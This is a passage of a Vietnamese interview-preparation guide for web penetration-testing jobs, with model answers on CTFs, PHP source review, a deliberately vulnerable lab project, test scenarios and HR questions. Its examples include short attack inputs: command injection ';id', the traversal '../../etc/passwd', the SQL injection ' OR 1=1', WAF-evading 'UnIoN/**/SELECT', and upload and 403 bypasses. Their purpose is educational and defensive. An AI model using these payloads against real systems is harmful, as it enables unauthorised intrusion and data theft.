VD: View-source tìm comment `<!-- /debug -->`.

### 203. Burp CTF?
Mẫu: Proxy + Repeater + Intruder fuzz flag.
VD: Repeater sửa id lấy flag user khác.

### 204. Học gì cho pentest?
Mẫu: Tư duy enumeration + PoC nhanh + viết steps.
VD: CTF dạy thử `admin:true` trước.

### 205. CTF khác pentest?
Mẫu: CTF 1-2 lỗi chủ đích lấy flag, pentest scope rộng + report + không phá production.
VD: CTF dump thoải mái, pentest dừng khi thấy data thật.

## 14. Source Review 206-214
### 206. Review PHP tìm gì?
Mẫu: SQLi/XSS/RCE/upload/LFI/auth.
VD: `$_GET` không filter.

### 207. SQLi từ code?
Mẫu: Tìm query ghép biến.
VD: `"SELECT...".$_GET['id']` -> lỗi, fix prepared.

### 208. XSS từ code?
Mẫu: Tìm echo/input ra HTML không encode.
VD: `echo $_GET['q']` -> `htmlspecialchars`.

### 209. Source Sink?
Mẫu: Source vào, sink thực thi, thiếu sanitize là vuln.
VD: `$_GET` -> `system()` = RCE.

### 210. Command trong code?
Mẫu: Tìm system/exec/shell_exec ghép input.
VD: `system("ping ".$ip)` -> `;id` RCE.

### 211. File inclusion?
Mẫu: Tìm include/require với biến.
VD: `include($_GET['page'])` -> `../../etc/passwd`.

### 212. Deser?
Mẫu: Tìm unserialize/pickle/loads với input.
VD: `unserialize($_COOKIE)` -> object injection.

### 213. JS giúp gì?
Mẫu: Lộ endpoint/API key/logic/sink.
VD: Bundle có `/api/admin` + key.

### 214. Đọc API tìm author?
Mẫu: Tìm route + middleware check quyền.
VD: Route `/delete` thiếu `if(user.role!=admin)` là lỗi.

## 15. Programming 215-224
### 215. Python khác JS?
Mẫu: Python backend/script, JS chạy browser + backend node, JS async/event.
VD: Python viết exploit script, JS DOM XSS.

### 216. PHP trong web?
Mẫu: Chạy server sinh HTML.
VD: `index.php` query MySQL.

### 217. JOIN?
Mẫu: Gộp 2 bảng theo khóa.
VD: Users JOIN Orders lấy đơn theo user.

### 218. INNER vs LEFT?
Mẫu: INNER chỉ chung, LEFT giữ hết trái.
VD: LEFT giữ user chưa mua.

### 219. PK/FK?
Mẫu: PK duy nhất 1 bảng, FK trỏ PK bảng khác.
VD: `users.id` PK, `orders.user_id` FK.

### 220. UNION?
Mẫu: Nối kết quả 2 SELECT cùng cột.
VD: Dùng UNION lấy pass bảng khác.

### 221. Python gửi HTTP?
Mẫu: Dùng requests.
VD: `requests.post(url, json={"id":1}, headers={...})`.

### 222. Python pentest?
Mẫu: Fuzz/brute/parse/log/exploit.
VD: Script brute OTP 000000-999999.

### 223. Automation?
Mẫu: Có, script check IDOR/rate.
VD: For lặp id 1000-1010 check length.

### 224. Vì sao biết code?
Mẫu: Đọc hiểu lỗi, viết PoC/tool, sửa cho dev.
VD: Không code chỉ chạy tool thì miss logic.

## 16. Project PHP 225-234
### 225. Vì sao dựng?
Mẫu: Học bằng tay, hiểu từ code tới exploit tới fix.
VD: Đọc lý thuyết upload không nhớ, tự làm thì nhớ.

### 226. Kiến trúc?
Mẫu: PHP + MySQL + Apache, MVC đơn giản login/upload/profile.
VD: `login.php, upload.php, db.sql`.

### 227. DB gì?
Mẫu: MySQL/MariaDB.
VD: Bảng users/files.

### 228. Tạo vuln sao?
Mẫu: Cố tình bỏ check: ghép query, echo thẳng, chỉ check ext.
VD: `move_uploaded_file` chỉ check `.jpg` chuỗi.

### 229. Upload implement?
Mẫu: Form -> check tên -> move -> hiện link.
VD: Đổi `shell.php` thành `shell.php.jpg` bypass rồi thực thi.

### 230. Insecure Design đâu?
Mẫu: Thiếu rate/lock, reset token đoán được, không phân quyền.
VD: Quên mật khẩu token 4 số.

### 231. Misconfig đâu?
Mẫu: Debug on, dir listing, default pass, .git.
VD: `display_errors=On` lộ query.

### 232. Có secure version?
Mẫu: Có 1 phần: prepared + whitelist + random name, đang làm tiếp.
VD: Fix upload whitelist + `uniqid().jpg`.

### 233. Làm lại đổi gì?
Mẫu: Thêm Docker, test + fix song song, viết unit + checklist OWASP.
VD: Mỗi lỗi có 2 branch vulnerable/secure.

### 234. Giúp pentest?
Mẫu: Hiểu root cause, viết remediation chuẩn, tự tin demo.
VD: Gặp upload thật biết check 5 lớp ngay.

## 17. Blog 235-240
### 235. Vì sao viết?
Mẫu: Ghi nhớ + chia sẻ + chứng minh làm thật.
VD: Quên payload thì mở lại blog.

### 236. Tự tin nhất?
Mẫu: Bài IDOR/SQLi có PoC ảnh Burp.
VD: Bài SSRF metadata có steps reproduce.

### 237. Nghiên cứu sao?
Mẫu: Đọc PortSwigger/HackTricks -> lab -> ghi.
VD: Đọc doc JWT rồi lab alg none.

### 238. Kiểm chứng PoC?
Mẫu: Làm 2 lần + 2 account + lab sạch.
VD: Dùng test account, không data thật.

### 239. Writeup vs research?
Mẫu: Writeup kể steps 1 challenge, research giải thích bản chất + nhiều case.
VD: Writeup CTF 1 flag, research SSRF nhiều bypass.

### 240. Viết end-to-end?
Mẫu: Có, từ cause tới fix.
VD: Bài file upload từ code tới shell tới whitelist.

## 18. Tình huống 241-254
### 241. Cho domain no source?
Mẫu: Scope -> sub/dir/tech -> Burp map -> test OWASP.
VD: Subfinder + ffuf + check JS.

### 242. Login test gì?
Mẫu: SQLi, enum, brute/rate, reset, 2FA, session.
VD: Thử `' OR 1=1`, `user valid` error khác.

### 243. A đọc B?
Mẫu: Xác định IDOR/BAC, thử 2 account chéo.
VD: Đổi `orderId=1001->1002` với token A.

### 244. API lộ nhạy cảm?
Mẫu: Xem PII/key, ai gọi được, cần auth không, đánh CVSS.
VD: `/api/me` trả CCCD user khác là High.

### 245. Param URL nghi SSRF?
Mẫu: Thử collab + internal + metadata, check redirect/DNS.
VD: `?url=http://collab` ping về là dính.

### 246. Chặn .php?
Mẫu: Thử double/case/mime/magic/.htaccess/traversal.
VD: `shell.pHp`, `shell.php.jpg` + content `GIF89a`.

### 247. XSS không chạy?
Mẫu: F12 xem encode/context, thử tag/event khác, check CSP.
VD: `<` bị encode thì thử `"` + `onfocus`.

### 248. 403?
Mẫu: Check auth/thiếu role/WAF/IP, thử method/case/trailing.
VD: `/admin` 403 thì thử `/ADMIN`, `X-Original-URL`.

### 249. WAF chặn?
Mẫu: Encode/comment/case/chia nhỏ, đổi method, xác minh manual.
VD: `UNION` -> `UnIoN/**/SELECT`.

### 250. Scanner báo nhưng manual không?
Mẫu: Coi false positive, reproduce tay, check điều kiện.
VD: Scanner báo blind nhưng time không delay -> loại.

### 251. Không tới RCE có report?
Mẫu: Có, report theo impact chứng minh được.
VD: Chỉ đọc file vẫn High, không cần RCE.

### 252. 10k user nhưng khó exploit?
Mẫu: Vẫn High/Critical vì impact rộng, nêu điều kiện.
VD: Cần MITM nhưng lộ token 10k vẫn Critical.

### 253. Thấy data thật?
Mẫu: Dừng ngay, không lưu/lan, báo lead/khách, xóa local.
VD: Chụp 1 dòng che PII để PoC.

### 254. Downtime?
Mẫu: Dừng test, báo ngay, giữ request log, hỗ trợ rollback.
VD: Gọi lead + note payload gây lỗi.

## 19. Đánh vào CV 255-265
### 255. 1 vuln end-to-end?
Mẫu: Chọn IDOR: cause thiếu check -> đổi ID -> lộ PII -> fix check owner.
VD: `GET /user/1001->1002` lộ email, fix `if(session.id!=req.id) deny`.

### 256. Business Logic VD?
Mẫu: Coupon dùng lại, giá âm.
VD: Áp mã 1 lần thành 10 lần bằng Repeater.

### 257. HTTPS handshake?
Mẫu: TCP -> ClientHello -> Server cert -> key exchange -> Finished mã hóa.
VD: Sniff chỉ thấy cipher.

### 258. Linux task?
Mẫu: Sẵn sàng demo `ps/grep/chmod/curl/ss`.
VD: `ps aux|grep nginx`, `chmod 755 script.sh`.

### 259. API methodology?
Mẫu: Doc -> auth -> BOLA -> mass -> inject -> rate.
VD: Swagger + 2 token test chéo.

### 260. Incident từ PCAP?
Mẫu: Lọc HTTP/DNS, follow stream, tìm beacon/C2, timeline.
VD: `http contains password` + beacon 60s.

### 261. SQLi từ PHP?
Mẫu: Chỉ đoạn ghép `$_GET` vào query.
VD: `$q="SELECT...".$_GET['id']` -> prepared.

### 262. Lab khó nhất?
Mẫu: Blind time/OOB hoặc SSRF bypass vì phải kiên nhẫn diff.
VD: Blind phải brute từng char bằng Intruder.

### 263. Sao chưa 100%?
Mẫu: Thẳng thắn thiếu advanced smuggling/cache/JWT, đang vá theo checklist.
VD: Đã xong XSS/CSRF/SSRF cơ bản, còn P0 auth nâng cao.

### 264. Hiểu sâu nhất?
Mẫu: XSS/IDOR vì làm nhiều lab + CTF + project.
VD: Kể source-sink + 2 account demo.

### 265. Yếu nhất?
Mẫu: Pwn/binary + smuggling/deser nâng cao, đang học.
VD: Chưa thạo gadget chain Java.

## 20. HR 266-275
### 266. Sao chọn bạn?
Mẫu: Đúng web/API, có intern + CTF + project + viết được report.
VD: Vào làm được ngay checklist OWASP cơ bản.

### 267. Muốn học gì?
Mẫu: Quy trình chuẩn, review report senior, cloud/API.
VD: Muốn được mentor sửa PoC.

### 268. Teamwork?
Mẫu: Chia theo sở trường, sync Burp notes, review chéo.
VD: CTF em web, bạn net.

### 269. Bất đồng?
Mẫu: Dựa PoC/log, thử lại cùng, ưu mục tiêu chung.
VD: Tranh cãi severity thì mở CVSS cùng chấm.

### 270. Task chưa biết?
Mẫu: Search doc/lab nhỏ, hỏi mentor sau khi thử 1h, note lại.
VD: Chưa gặp GraphQL thì lab 1 room rồi hỏi.

### 271. Quản lý giờ?
Mẫu: Timebox học/làm, ưu P0 trước.
VD: Sáng intern, tối 2h PortSwigger.

### 272. Bị sửa report?
Mẫu: Cảm ơn + sửa + hỏi chuẩn để lần sau đúng.
VD: Bị sửa CVSS thì học lại vector.

### 273. Off vs Def?
Mẫu: Thích Off vì tìm lỗi, nhưng tôn trọng Def/SOC vì thấy full vòng.
VD: Muốn vào VinSOC để hiểu Def.

### 274. Lâu dài?
Mẫu: Web/API 2 năm rồi mở Red Team, không nhảy vội.
VD: Mục tiêu OSCP sau vững web.

### 275. Môi trường mong?
Mẫu: Được học, được review thẳng, lab/Cert được hỗ trợ.
VD: Có senior review report hàng tuần.
